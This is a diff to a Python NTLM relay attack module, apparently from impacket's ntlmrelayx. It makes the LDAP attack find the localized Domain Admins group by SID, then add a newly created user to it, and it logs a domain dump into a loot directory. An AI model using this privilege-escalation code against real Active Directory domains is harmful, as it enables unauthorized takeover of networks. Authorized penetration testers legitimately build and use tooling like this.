@@ -178,8 +178,9 @@ class LDAPAttack(Thread):
         else:
             logging.info('Adding new user with username: %s and password: %s result: OK' % (newUser,newPassword))
 
-        #TODO: Fix this with localized DA group
-        res = self.client.connection.modify('CN=Domain Admins,CN=Users,%s' % domainDumper.root, {
+        domainsid = domainDumper.getRootSid()
+        dagroupdn = domainDumper.getDAGroupDN(domainsid)
+        res = self.client.connection.modify(dagroupdn, {
             'member': [(self.client.MODIFY_ADD, ['CN=%s,CN=Users,%s' % (newUser, domainDumper.root)])]})
         if res:
             logging.info('Adding user: %s to group Domain Admins result: OK' % newUser)
@@ -212,9 +213,12 @@ class LDAPAttack(Thread):
         else:
             logging.info('User is not a Domain Admin')
             if not dumpedDomain and self.config.dumpdomain:
-                dumpedDomain = True
+                #do this before the dump is complete because of the time this can take
+                dumpedDomain = True 
                 logging.info('Dumping domain info for first time')
                 domainDumper.domainDump()
+                logging.info('Domain info dumped into lootdir!')
+
 
 class HTTPAttack(Thread):
     def __init__(self, config, HTTPClient, username):
